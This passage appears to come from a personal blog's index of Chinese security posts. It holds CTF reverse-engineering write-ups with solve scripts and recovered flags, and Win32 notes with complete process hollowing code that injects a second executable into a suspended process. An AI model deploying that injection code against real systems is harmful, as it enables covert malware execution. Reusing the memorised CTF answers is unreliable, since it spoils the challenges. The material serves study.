target, i1, i2, i3, i4); *a1 = i1; *a2 = i2; *a3 = i3; *a4 = i4; &#125; &#125; &#125; &#125; &#125;&#125;unsigned char findIndex1(BYTE data)&#123; BYTE* array = RijnDael_AES_LONG_inv_406120; for (unsigned char i = 0; i &lt; 256; i++) &#123; if (array[i] == data) return i; &#125; return -1;&#125;void decrypt(DWORD* miwen, DWORD* flag)&#123; int key_index = 59; DWORD v12, v14, v16, v18; DWORD v11, v13, v15, v17; unsigned char _v9[4] = &#123; 0 &#125;; unsigned char _v8[4] = &#123; 0 &#125;; unsigned char _v7[4] = &#123; 0 &#125;; unsigned char _i[4] = &#123; 0 &#125;; DWORD v9, v8, v7, i; v12 = miwen[0] ^ key[key_index--]; v14 = miwen[1] ^ key[key_index--]; v16 = miwen[2] ^ key[key_index--]; v18 = miwen[3] ^ key[key_index--]; // 得到v9, v8, v7, i; _i[0] = findIndex1(BYTE0(v12)); _v9[1] = findIndex1(BYTE1(v12)); _v8[2] = findIndex1(BYTE2(v12)); _v7[3] = findIndex1(BYTE3(v12)); _v7[0] = findIndex1(BYTE0(v14)); _i[1] = findIndex1(BYTE1(v14)); _v9[2] = findIndex1(BYTE2(v14)); _v8[3] = findIndex1(BYTE3(v14)); _v8[0] = findIndex1(BYTE0(v16)); _v7[1] = findIndex1(BYTE1(v16)); _i[2] = findIndex1(BYTE2(v16)); _v9[3] = findIndex1(BYTE3(v16)); _v9[0] = findIndex1(BYTE0(v18)); _v8[1] = findIndex1(BYTE1(v18)); _v7[2] = findIndex1(BYTE2(v18)); _i[3] = findIndex1(BYTE3(v18)); v9 = *(DWORD*)_v9; v8 = *(DWORD*)_v8; v7 = *(DWORD*)_v7; i = *(DWORD*)_i; // v9 = 0x948726e2; // v8 = 0x51f188a1; // v7 = 0x9b05b51d; // i = 0xb9f8810c; for (int j = 0; j &lt; 13; j++) &#123; v11 = i ^ key[key_index--]; v13 = v7 ^ key[key_index--]; v15 = v8 ^ key[key_index--]; v17 = v9 ^ key[key_index--]; brute(v11, &amp;_v9[1], &amp;_v8[2], &amp;_v7[3], &amp;_i[0]); brute(v13, &amp;_i[1], &amp;_v9[2], &amp;_v8[3], &amp;_v7[0]); brute(v15, &amp;_v7[1], &amp;_i[2], &amp;_v9[3], &amp;_v8[0]); brute(v17, &amp;_v8[1], &amp;_v7[2], &amp;_i[3], &amp;_v9[0]); v9 = *(DWORD*)_v9; v8 = *(DWORD*)_v8; v7 = *(DWORD*)_v7; i = *(DWORD*)_i; &#125; flag[0] = i ^ key[key_index--]; flag[1] = v7 ^ key[key_index--]; flag[2] = v8 ^ key[key_index--]; flag[3] = v9 ^ key[key_index--];&#125;int main()&#123; printf(&quot;Start...\\n&quot;); DWORD cmp_data[8] = &#123; 0xE82BA79E, 0x83EA91DE, 0x241BCCFE, 0x2836973B, 0x5F86C92D, 0x0C8094E88, 0x0FEC81BB0, 0x0D5277623 &#125;; //DWORD cmp_data[8] = &#123;0X21266A63, 0XE7FC84AC, 0XEEDD698D, 0XE64535D6, 0X21266A63, 0XE7FC84AC, 0XEEDD698D, 0XE64535D6&#125;; //拿1234567890123456做测试 DWORD flag[8] = &#123; 0 &#125;; decrypt(cmp_data, flag); decrypt(&amp;cmp_data[4], &amp;flag[4]); printf(&quot;flag: %s\\n\\n&quot;, (char*)flag); char* tmp = (char*)flag; for (int i = 0; i &lt; 32; i++) &#123; printf(&quot;%X, &quot;, tmp[i]); &#125; return 0;&#125; 最终跑出来的数据为 稍作处理 123456789101112#include &lt;stdio.h&gt;int main()&#123; unsigned int a[] = &#123;0XFFFFFFF2, 0XFFFFFF88, 0X35, 0X49, 0XFFFFFFF8, 0X5C, 0X2A, 0X4, 0XFFFFFFA8, 0X4E, 0XFFFFFF86, 0XFFFFFF9E, 0XFFFFFFBE, 0XFFFFFFF9, 0X2A, 0XE, 0XFFFFFFC6, 0X4, 0XFFFFFF94, 0X56, 0X14, 0XFFFFFF89, 0X4C, 0X4C, 0X2E, 0XFFFFFF9C, 0X17, 0XFFFFFFC4, 0XFFFFFFC2, 0XFFFFFFA7, 0XFFFFFF82, 0X1F&#125;; for (int i = 0; i &lt; 32; i++) &#123; printf(&quot;%X &quot;, a[i] &amp; 0xff); &#125; return 0;&#125;//F2 88 35 49 F8 5C 2A 4 A8 4E 86 9E BE F9 2A E C6 4 94 56 14 89 4C 4C 2E 9C 17 C4 C2 A7 82 1F 找到源程序，调试起来，修改flag，进行验证 修改为 运行 发现程序输出success 所以最终的flag应该是 1flag = b&#x27;flag&#123;\\xF2\\x88\\x35\\x49\\xF8\\x5C\\x2A\\x4\\xA8\\x4E\\x86\\x9E\\xBE\\xF9\\x2A\\xE\\xC6\\x4\\x94\\x56\\x14\\x89\\x4C\\x4C\\x2E\\x9C\\x17\\xC4\\xC2\\xA7\\x82\\x1F&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"}]},{"title":"陇原战\"疫\"2021网络安全大赛_RE_WP","slug":"陇原战疫2021_RE_WP","date":"2021-11-11T02:00:00.000Z","updated":"2021-11-29T11:44:57.427Z","comments":true,"path":"2021/11/11/陇原战疫2021_RE_WP/","link":"","permalink":"https://zzzzsky.github.io/2021/11/11/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021_RE_WP/","excerpt":"","text":"陇原战”疫”2021网络安全大赛_RE_WPEasyRe方法一IDA打开分析 发现sub_4111406这个函数是对输入的flag进行加密，然后将加密后的数据存放到0X41A14C中 来到sub_4111406函数，并不能F5, 直接动态调试一直跟 、 发现程序在不断的生成一些数据，长度是32 多次调试，不同输入，这里获取的数据是一样的 分析，还原算法 12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD * enc(char* flag, char* key)&#123; DWORD* pdw_flag = (DWORD*)flag; DWORD* pdw_key = (DWORD*)key; for (int i = 0; i &lt; 8; i++) &#123; pdw_flag[i] ^= pdw_key[(7 * i + 2) % 8]; &#125; for (int i = 0; i &lt; 8; i++) &#123; pdw_flag[i] ^= pdw_flag[i] &lt;&lt; 7; pdw_flag[i] ^= pdw_key[(7 * i + 3) % 8]; pdw_flag[i] ^= pdw_flag[(5 * i + 3) % 8]; pdw_flag[i] ^= pdw_flag[i] &lt;&lt; 13; pdw_flag[i] ^= pdw_key[(7 * i + 5) % 8]; pdw_flag[i] ^= pdw_flag[i] &lt;&lt; 17; &#125; return pdw_flag;&#125;int main()&#123; char flag[33] = &quot;12345678901234567890123456789012&quot;; char key[32] = &#123; 12, 21, 30, 39, 32, 41, 50, 59, 68, 77, 86, 95, 88, 97, 106, 115, 124, 133, 142, 151, 144, 153, 162, 171, 180, 189, 198, 207, 200, 209, 218, 227&#125;; enc(flag, key); return 0; //在这里下断点观察加密后的数据是否与IDA调试时生成的一样&#125; 在末尾下断点调试 IDA调试运行下断点观察加密后的数据 发现是一样的，还原加密算法成功，现在开始写解密脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;stdio.h&gt;#include &lt;windows.h&gt;VOID dec_shift_xor(DWORD* mingwen, int shiftlen) &#123; //pdw_flag[i] ^= pdw_flag[i] &lt;&lt; 13 类似这种加密方式，知道加密后的，解密得到原来的数据 //mingwen指向明文 //shiftlen指向移位的的位数 DWORD data = *mingwen; DWORD mask = 1; for (int i = 0; i &lt; shiftlen - 1; i++) &#123; // 构造mask mask = (mask &lt;&lt; 1) + 1; &#125; DWORD zuidi2wei = data &amp; mask; int count = 32 / shiftlen; count = 32 % shiftlen == 0 ? count : count + 1; for (int i = 0; i &lt; count; i++) &#123; zuidi2wei &lt;&lt;= shiftlen; mask &lt;&lt;= shiftlen; data ^= zuidi2wei; zuidi2wei = data &amp; mask; &#125; *mingwen = data;&#125;DWORD* dec(char* enc_flag, char* key)&#123; DWORD* pdw_flag = (DWORD*)enc_flag; DWORD* pdw_key = (DWORD*)key; for (int i = 7; i &gt;=0; i--) &#123; dec_shift_xor(&amp;pdw_flag[i], 17); pdw_flag[i] ^= pdw_key[(7 * i + 5) % 8]; dec_shift_xor(&amp;pdw_flag[i], 13); pdw_flag[i] ^= pdw_flag[(5 * i + 3) % 8]; pdw_flag[i] ^= pdw_key[(7 * i + 3) % 8]; dec_shift_xor(&amp;pdw_flag[i], 7); &#125; for (int i = 0; i &lt; 8; i++) &#123; pdw_flag[i] ^= pdw_key[(7 * i + 2) % 8]; &#125; return pdw_flag;&#125;int main()&#123; char key[32] = &#123; 12, 21, 30, 39, 32, 41, 50, 59, 68, 77, 86, 95, 88, 97, 106, 115, 124, 133, 142, 151, 144, 153, 162, 171, 180, 189, 198, 207, 200, 209, 218, 227&#125;; char enc_flag[33] = &#123; 0x15, 0x86, 0x0F, 0xF9, 0x3D, 0x7C, 0x82, 0xC8, 0x63, 0x32, 0xD7, 0x1B, 0x54, 0x74, 0x0C, 0xA9, 0x05, 0x4E, 0x3F, 0x7D, 0x19, 0xBC, 0xE4, 0x53, 0x7F, 0x39, 0x5B, 0xA8, 0x5E, 0xA4, 0xB2, 0xD4,0&#125;; //提取的0X41A058处的数据 dec(enc_flag, key); printf(&quot;%s&quot;, enc_flag); return 0;&#125; 得到 fc5e038d38a57032085441e7fe7010b0，加上 flag{} 得到 flag&#123;fc5e038d38a57032085441e7fe7010b0&#125; 方法二去花指令 123456789101112131415161718192021222324252627282930313233from ida_bytes import get_bytes, patch_bytesimport readdr = 0x415B53end = 0x0415B79buf = get_bytes(addr, end - addr)buf_str = &quot;&quot;.join([chr(i) for i in list(buf)])pattern = r&quot;\\xE8\\x01\\x00\\x00\\x00.\\x33\\xDB\\x33\\xC0\\x33\\xC9\\x59\\x83\\xC0([\\s\\S])\\xBB([\\s\\S])\\x00\\x00\\x00\\xF7\\xE3\\x83\\xC1\\x20\\x83\\xC0([\\s\\S])\\x33\\xC3\\x51(\\x88\\x45[\\s\\S])\\xC3.&quot;def handler(s): eax = ord(s.group(1)[0]) ebx = ord(s.group(2)[0]) tmp = ord(s.group(3)[0]) c = s.group(4) eax = eax * ebx eax += tmp eax ^= ebx patch_ = &quot;\\xB8&quot; + chr(eax) + &quot;\\x00\\x00\\x00&quot; return patch_ + &#x27;\\x90&#x27;*(0x25-5-5) + c + &quot;\\x90&quot; * 2buf = re.sub(pattern, handler, buf_str, flags=re.I)buf_bytes = bytes([ord(i) for i in buf])patch_bytes(addr, buf_bytes)print(&quot;OK&quot;) Z3模块解决 12345678910111213141516171819202122232425262728293031323334from z3 import *if __name__ == &quot;__main__&quot;: enc = [0xF90F8615, 0xC8827C3D, 0x1BD73263, 0x0A90C7454, 0x7D3F4E05, 0x53E4BC19, 0xA85B397F, 0xD4B2A45E] v5 = [0] * 8 flag = [BitVec(f&quot;flag_&#123;i&#125;&quot;, 32) for i in range(8)] s = Solver() v4 = [0x271E150C, 0x3B322920, 0x5F564D44, 0x736A6158, 0x978E857C, 0xABA29990, 0xCFC6BDB4, 0xE3DAD1C8] for i in range(8): v5[i] = flag[i] ^ v4[(7 * i + 2) % 8] for j in range(8): v5[j] ^= v5[j] &lt;&lt; 7 v5[j] ^= v4[(7 * j + 3) % 8] v5[j] ^= v5[(5 * j + 3) % 8] v5[j] ^= v5[j] &lt;&lt; 13 v5[j] ^= v4[(7 * j + 5) % 8] v5[j] ^= v5[j] &lt;&lt; 17 for i in range(8): s.add(v5[i] == enc[i]) assert s.check() == sat m = s.model() flag = [int.to_bytes(m[i].as_long(), 4, byteorder=&quot;little&quot;).decode() for i in flag] print(&quot;&quot;.join(flag)) EasyRe_Revenge此题与EasyRe_Revenge一样，只是把密文换了，替换上图中的enc_flag即可 1char enc_flag[33] = &#123; 66, 176, 232, 238, 108, 238, 208, 87, 50, 75, 245, 243, 214, 183, 240, 211, 137, 195, 97, 10, 64, 186, 199, 56, 44, 158, 61, 12, 132, 146, 74, 214,0 &#125;; 后来发现，原来EasyRe那道题目，flag直接存在字符串中了，所以把密文换了，才有了这个EasyRe_Revenge findmeIDA打开分析 来到 403844 这个位置 很显然这个位置不可能是strcmp，观察发现404840那个地址处还存了个函数的地址 sub_401866，估计程序有地方把403844这个地方的地址给替换掉了 来到401866位置 分析401767函数，发现是明显的RC4加密 随便输入一个假的flag，12345678901234567890123456， 然后断下，看加密后的数据 写脚本得到密钥流 12345678fake_flag = &quot;12345678901234567890123456&quot;enc_fake_flag = [ 0xD5, 0x25, 0xE2, 0xB6, 0xF1, 0x99, 0x4B, 0xD4, 0xB5, 0x1B, 0x81, 0xD0, 0x47, 0x8F, 0xEF, 0x35, 0x05, 0x46, 0x48, 0xEB, 0x8C, 0x21, 0x6C, 0xB8, 0x05, 0x8D]key = [ord(fake_flag[i]) ^ enc_fake_flag[i] for i in range(26)]print(key)# [228, 23, 209, 130, 196, 175, 124, 236, 140, 43, 176, 226, 116, 187, 218, 3, 50, 126, 113, 219, 189, 19, 95, 140, 48, 187] 然后提取出dword_403040解密即可 12345enc = [0xFFFFFFB7, 0x52, 0x0FFFFFF85, 0x0FFFFFFC1, 0x0FFFFFF90, 0x0FFFFFFE9, 0x7, 0xFFFFFFB8, 0x0FFFFFFE4, 0x1A, 0x0FFFFFFC3, 0x0FFFFFFBD, 0x1D, 0x0FFFFFF8E, 0x0FFFFFF85, 0x46, 0x0, 0x21, 0x44, 0x0FFFFFFAF, 0x0FFFFFFEF, 0x70, 0x32, 0x0FFFFFFB5, 0x11, 0x0FFFFFFC6]key = [228, 23, 209, 130, 196, 175, 124, 236, 140, 43, 176, 226, 116, 187, 218, 3, 50, 126, 113, 219, 189, 19, 95, 140, 48, 187]flag = [chr((enc[i] &amp; 0XFF) ^ key[i]) for i in range(26)]print(&quot;&quot;.join(flag))# SETCTF&#123;Th1s_i5_E2_5tRcm9!&#125; power拿到题目，附件是ARM汇编源文件 直接用arm-none-eabi-as.exe power编译下生成a.out IDA打开 发现是AES加密，这里写的是CBC模式，但其实是ECB模式，写脚本解密即可 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from Crypto.Cipher import AESimport base64import binasciiclass Aescrypt(): def __init__(self, key, model, iv): self.key = self.add_16(key) self.model = model self.iv = iv def add_16(self, par): if type(par) == str: par = par.encode() while len(par) % 16 != 0: par += b&#x27;\\x00&#x27; return par def aesencrypt(self, text): text = self.add_16(text) if self.model == AES.MODE_CBC: self.aes = AES.new(self.key, self.model, self.iv) elif self.model == AES.MODE_ECB: self.aes = AES.new(self.key, self.model) self.encrypt_text = self.aes.encrypt(text) return self.encrypt_text def aesdecrypt(self, text): if self.model == AES.MODE_CBC: self.aes = AES.new(self.key, self.model, self.iv) elif self.model == AES.MODE_ECB: self.aes = AES.new(self.key, self.model) self.decrypt_text = self.aes.decrypt(text) self.decrypt_text = self.decrypt_text.strip(b&quot;\\x00&quot;) return self.decrypt_textif __name__ == &#x27;__main__&#x27;: passwd = b&quot;this_is_a_key!!!&quot; enc_flag_str = &quot;1030a9254d44937bed312da03d2db9adbec5762c2eca7b5853e489d2a140427b&quot; enc_flag = binascii.unhexlify(enc_flag_str) aescryptor = Aescrypt(passwd, AES.MODE_ECB, None) # ECB text = aescryptor.aesdecrypt(enc_flag) print(&quot;明文:&quot;, text) # 明文: b&#x27;flag&#123;y0u_found_the_aes_12113112&#125;&#x27; Eat_something核心代码在Eat_something.wasm中 找到工具将wasm转为.o文件 https://www.52pojie.cn/thread-1438499-1-1.html 用IDA打开，找到w2c_checkright函数，这是验证flag的地方 核心算法就是这一句 v13 != (i32_load(w2c_memory, v16 + 12LL) ^ (2 * v10)) 翻译下就是enc[i] != i ^ (flag[i] * 2) 将enc提取出来，写脚本即可 123456789101112enc = [0x86, 0x8B, 0xAA, 0x85, 0xAC, 0x89, 0xF0, 0xAF, 0xD8, 0x69, 0xD6, 0xDD, 0xB2, 0xBF, 0x6E, 0xE5, 0xAE, 0x99, 0xCC, 0xD5, 0xBC, 0x8B, 0xF2, 0x7D, 0x7A, 0xE3, 0x59, 0x6F, 0x75, 0x20, 0x61, 0x72, 0x65, 0x20, 0x72, 0x69, 0x67, 0x68, 0x74, 0x21, 0x00, 0x59, 0x6F, 0x75, 0x20, 0x61, 0x72, 0x65, 0x20, 0x77, 0x72, 0x6F, 0x6E, 0x67, 0x21, 0x00] flag = []for i in range(26): flag .append(chr((i ^ enc[i]) // 2))print(&quot;&quot;.join(flag))# CETCTF&#123;Th0nk_Y0u_DocTOr51&#125; 最后将CETCTF 改为 SETCTF即为flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"}]},{"title":"win32学习笔记","slug":"WIN32学习","date":"2019-05-18T02:55:00.000Z","updated":"2022-03-04T12:38:39.937Z","comments":true,"path":"2019/05/18/WIN32学习/","link":"","permalink":"https://zzzzsky.github.io/2019/05/18/WIN32%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"字符编码1. ASCII编码0 - 7F， 0000 0000——–0111 1111标准ASCII码80 - FF 1000 0000 ——-1111 1111 扩展ASCII码 2.GB2312或GB2312-80(针对自己国家)基于扩展ASCII码 单独看每一个字节，都是扩展ASCII码表中的数据，2个表示一个汉字，这就是GB2312编码，但是GB2312存在很大的弊端，例:将一份GB2312编码的邮件发给一个老外的时候，它看到的是乱码，因为不同国家的解释不一样，Big5编码的思路跟GB2312一样，同样的字节，不同的数据，因为解释的不一样怎么解决问题这个乱码问题呢？UNICODE出现 3. UNICODE这是一个编码方案，说白了就是一张包含全世界所有文字的一个编码表，只要这个世界上存在的文字符号，统统给你一个唯一的编码:UNICODE编码范围是: 0 - 0X10FFFF， 可以容纳100多万个符号！ UNICODE 的问题？ 假如说： 中: 0x12 34 国:0x01 23 45 A: 0x41 用多少个字节来存储呢？UNICODE只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储 4. 如何存储UNICODEUTF-16\\UTF-8是UNICODE的实现方式 UTF-16UTF-16编码以16位无符号整数为单位，注意是16位为一个单位，不表示一个字符就只有16位。这个要看字符的UNICODE编码处于什么范围而定，有可能是2个字节，也有可能是4个字节，现在机器上的UNCODE 编码一般指的就是UTF-16 因为它任何符号都是以2个字节为单位，对于A,B,C这种简单的符号，一个字节就够了，所以用UTF-16可能会浪费空间，在网络传输中效率可能会慢， UTF-8 比如在记事本中写入 “AB字”，然后分别存储为UTF-16 或 UTF-8的格式 “字” UTF-16 是 5B 57​ UTF-8 是 E5 AD 97E5 AD 971110 0101 10****10 1101 10****01 0111红色部分拼接为0101 1011 0101 0111，即5B 57 那么给定一个文本，怎么知道是解析为UTF-16还是UTF-8呢？ BOM (Byte Order Mark)(解决解析时候的问题)UTF-8 || EF BB BFUTF-16(LE) || FF FEUTF-16(BE) || FE FF这是前缀 进程的创建过程进程提供程序所需的资源，如：数据，代码等等。进程是静止不动的 进程内存空间的地址划分 一个进程里面含有一堆PE文件 进程是怎么创建的任何进程都是别的进程创建的：CreateProcess 映射EXE文件 创建内核对象EPROCESS 映射DLL文件(ntdll.dll) 所有EXE都得用到这个DLL文件 创建线程内核对象ETHREAD 系统启动线程 ​ 映射DLL（ntdll.LdrInitializeThunk） ​ 线程开始执行 可以在第4步与第5步之间做一些猥琐的事情，怎么在第4步与第5步之间搞事情呢？？？ 可以在CreateProcess这个函数的第6个参数__in DWORD dwCreationFlags,，将其设置为CREATE_SUSPENDED，然后线程就会被挂起，然后在这个地方进行PE映像切换（傀儡进程），这个在《逆向工程核心原理》第56章有讲，因为这里是讲进程的创建过程，所以对PE影响切换不再描述 这里是这种技术的实验代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef DWORD(WINAPI* _TZwUnmapViewOfSection)(HANDLE, PVOID);BOOL PeLoad(HANDLE hProcess, BYTE* peFile, BYTE* peRam, int size);CHAR* LoadFile(CHAR* filePath);DWORD FileBufferToImageBuffer(LPVOID pFileBuffer, LPVOID pImageBuffer);int main()&#123; STARTUPINFO si = &#123; 0 &#125;; PROCESS_INFORMATION pi = &#123;&#125;; CHAR szName[] = &quot;E:\\\\TrayS v1.1.3\\\\TrayS_x86\\\\TrayS.exe&quot;; si.cb = sizeof(si); //创建傀儡进程 BOOL res = CreateProcess( szName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi ); if (res == 0) &#123; printf(&quot;错误CODE: %d\\n&quot;, GetLastError()); &#125; //获取外壳的CONTEXT结构 CONTEXT contex; contex.ContextFlags = CONTEXT_FULL; GetThreadContext(pi.hThread, &amp;contex); printf(&quot;子进程PID: %d\\n&quot;, pi.dwProcessId); printf(&quot;%#X\\n&quot;, contex.Eax); //OEP + IMAGEBASE BYTE* baseAddress = (BYTE*)(contex.Ebx + 8); DWORD dwImageBase = 0; ReadProcessMemory(pi.hProcess, baseAddress, &amp;dwImageBase, 4, NULL); //卸载外壳程序的文件镜像 HMODULE hModuleNt = LoadLibrary(&quot;ntdll.dll&quot;); if (hModuleNt == NULL) &#123; //printf(&quot;获取ntdll句柄失败\\n&quot;); TerminateThread(pi.hThread, 0); return -1; &#125; _TZwUnmapViewOfSection pZwUnmapViewOfSection = (_TZwUnmapViewOfSection)GetProcAddress(hModuleNt, &quot;ZwUnmapViewOfSection&quot;); pZwUnmapViewOfSection(pi.hProcess, (PVOID)dwImageBase); CHAR szFileName[] = &quot;F:\\\\_重学RE笔记\\\\WIN32_PE学习\\\\傀儡进程\\\\傀儡进程\\\\假装自己是病毒.exe&quot;; CHAR * PEFILE = LoadFile(szFileName); IMAGE_DOS_HEADER* pidhsrc = (IMAGE_DOS_HEADER*)PEFILE; IMAGE_NT_HEADERS* pinhsrc = (IMAGE_NT_HEADERS*)(pidhsrc-&gt;e_lfanew + PEFILE); LPVOID pImageBase = VirtualAllocEx(pi.hProcess, (LPVOID)pinhsrc-&gt;OptionalHeader.ImageBase, pinhsrc-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if ((DWORD)pImageBase != pinhsrc-&gt;OptionalHeader.ImageBase) &#123; //printf(&quot;VirtualAllocEx 错误码: 0x%X\\n&quot;, GetLastError()); // 0x1e7 试图访问无效地址 //printf(&quot;申请到的指针: 0x%X, 期望的地址: 0x%X\\n&quot;, (DWORD)pImageBase, pinhsrc-&gt;OptionalHeader.ImageBase); TerminateThread(pi.hThread, 0); return -1; &#125; //7、拉伸PE文件，放到此位置 PeLoad(pi.hProcess, (BYTE *)PEFILE, (BYTE*)pImageBase, pinhsrc-&gt;OptionalHeader.SizeOfImage); //8、修改外壳程序的Context contex.Eax = pinhsrc-&gt;OptionalHeader.AddressOfEntryPoint + pinhsrc-&gt;OptionalHeader.ImageBase; DWORD imageBase = pinhsrc-&gt;OptionalHeader.ImageBase; WriteProcessMemory(pi.hProcess, LPVOID(contex.Ebx + 8), &amp;imageBase, 4, NULL); SetThreadContext(pi.hThread, &amp;contex); ResumeThread(pi.hThread); //释放资源区 free(PEFILE); return 0; return 0;&#125;//模拟PE加载//hProcess:进程句柄//peFile:PE拉伸前的地址（在本进程中）//peRam：ImageBase（在hProcess进程中）//size:PE拉伸后对齐的大小BOOL PeLoad(HANDLE hProcess, BYTE* peFile, BYTE* peRam, int size)&#123; BYTE* peImage = (BYTE*)malloc(size); FileBufferToImageBuffer(peFile, peImage); BOOL isSuccess = WriteProcessMemory(hProcess, peRam, peImage, size, NULL); free(peImage); return isSuccess;&#125;//将文件读取到内存CHAR* LoadFile(CHAR* filePath)&#123; FILE* fpShellFile; fopen_s(&amp;fpShellFile, filePath, &quot;rb&quot;); if (fpShellFile == 0) &#123; printf(&quot;加载病毒失败\\n&quot;); ExitProcess(-1); &#125; fseek(fpShellFile, 0, SEEK_END); DWORD dwShellFileSize = ftell(fpShellFile); CHAR* pShellFile = (CHAR*)malloc(dwShellFileSize); fseek(fpShellFile, 0, SEEK_SET); fread(pShellFile, 1, dwShellFileSize, fpShellFile); fclose(fpShellFile); return pShellFile;&#125;// 将PE文件拉伸// pFileBuffer：源文件读到内存去的首地址// pImageBuffer： 拉伸后文件读到内存去的首地址// 返回拉伸后的文件在内存中对齐后的大小DWORD FileBufferToImageBuffer(LPVOID pFileBuffer, LPVOID pImageBuffer)&#123; IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pFileBuffer; IMAGE_NT_HEADERS* pNtHeader = (IMAGE_NT_HEADERS*)(pDosHeader-&gt;e_lfanew + (DWORD)pDosHeader); IMAGE_FILE_HEADER* pPEHeader = (IMAGE_FILE_HEADER*)((DWORD)pNtHeader + 4); IMAGE_OPTIONAL_HEADER32* pOptionHeader = (IMAGE_OPTIONAL_HEADER32*)((DWORD)pPEHeader + sizeof(IMAGE_FILE_HEADER)); IMAGE_SECTION_HEADER* pSectionHeader = (IMAGE_SECTION_HEADER*)((DWORD)pOptionHeader + pPEHeader-&gt;SizeOfOptionalHeader); memset(pImageBuffer, 0, pNtHeader-&gt;OptionalHeader.SizeOfImage); //复制DOS头 + PE头 + 节表 + 文件对齐 memcpy(pImageBuffer, pFileBuffer, pNtHeader-&gt;OptionalHeader.SizeOfHeaders); for (int i = 0; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123; memcpy((LPVOID)((DWORD)pImageBuffer + pSectionHeader[i].VirtualAddress), (LPVOID)((DWORD)pFileBuffer + pSectionHeader[i].PointerToRawData), pSectionHeader[i].SizeOfRawData); &#125; return pNtHeader-&gt;OptionalHeader.SizeOfImage;&#125; 句柄表1、什么是内核对象？ 像进程、线程、文件、互斥体、事件等在内核都有一个对应的结构体，这些结构体由内核负责故案例。我们管这样的对象叫做内核对象。 2、 如何管理内核对象 通过句柄表 3、每个进程都有一个句柄表 不是每个内核对象都有句柄表，只有进程内核对象才有句柄表。 4、多进程共享一个内核对象 句柄表是一个私有的值，句柄只有在本进程中才有意义 CloseHandle使内核对象的引用计数 - 1，一般情况下引用计数为0了，没有任何指针指向它，这个内核对象就会被移除，但是进程内核对象和线程内核对象是特例，只有关闭所有的线程句柄和终止掉线程两个条件同时满足的时候，这个线程内核对象才会被移除。 5、 句柄是否可以被继承 在创建一个内核对象的时候，一定会有一个参数 12345typedef struct _SECURITY_ATTRIBUTES &#123; DWORD nLength; LPVOID lpSecurityDescriptor; BOOL bInheritHandle; //该内核对象是否可以被继承&#125; SECURITY_ATTRIBUTES, 6、进程是否能够继承父进程的句柄 当用CreateProcess创建进程的时候，第5个参数bInheritHandles如果设置为TRUE，那么父进程句柄表中可以被继承的内核对象句柄就会被继承过去，具体继承方式如上图所示，就是将整个句-柄表复制过去，不能继承的填充0，这样的话，在子进程中的句柄值可以与父进程一模一样 进程相关API PID是全局句柄表的索引，所以它在 所有进程中都有效 当前进程的 进程句柄 是当前进程句柄表的索引，所以它只在本进程有效 工作路径与模块路径 当前模块路径是不变的，文件放在哪，他就是啥 但是工作路径的话就不同了，工作路径是父进程通过CreateProcess这个API传给他的，通过参数 __in_opt LPCTSTR lpCurrentDirectory将工作目录传给子进程。 如下例: 其他API获取进程PID: GetCurrentProcessId获取进程句柄: GetCurrentProcess获取命令行: GetCommandLine获取启动信息: GetStartupInfo遍历进程ID: EnumProcesses快照: CreateToolhelp32Snapshot 线程1、什么是线程 ​ CreateThread 创建线程 线程是附属在进程上的执行实体，是代码的执行流程 一个进程可以包含多个线程，但一个进程至少要包含一个线程 2、控制线程 暂停线程恢复线程 SuspendThread() ResumeThread() //可以根据这个函数的返回值来判断线程是否挂起 等待线程结束 WaitForSingleObject() WaitForMultipleObject() GetExitCodeThread() 获取线程环境(线程切换的时候要保存环境) GetThreadContext() SetThreadContext()","categories":[{"name":"WIN32学习","slug":"WIN32学习","permalink":"https://zzzzsky.github.io/categories/WIN32%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"win32","slug":"win32","permalink":"https://zzzzsky.github.io/tags/win32/"}]}],"categories":[{"name":"pwn学习","slug":"pwn学习","permalink":"https://zzzzsky.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"},{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"},{"name":"工具","slug":"工具","permalink":"https://zzzzsky.github.io/categories/%E5%B7%A5%E5%85%B7/"},{"name":"安卓","slug":"安卓","permalink":"https://zzzzsky.github.io/categories/%E5%AE%89%E5%8D%93/"},{"name":"python","slug":"python","permalink":"https://zzzzsky.github.io/categories/python/"},{"name":"WIN32学习","slug":"WIN32学习","permalink":"https://zzzzsky.github.io/categories/WIN32%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://zzzzsky.github.io/tags/pwn/"},{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"},{"name":"《CTF竞赛权威指南-pwn篇》","slug":"《CTF竞赛权威指南-pwn篇》","permalink":"https://zzzzsky.github.io/tags/%E3%80%8ACTF%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-pwn%E7%AF%87%E3%80%8B/"},{"name":"shellcode","slug":"shellcode","permalink":"https://zzzzsky.github.io/tags/shellcode/"},{"name":"二叉树","slug":"二叉树","permalink":"https://zzzzsky.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"name":"v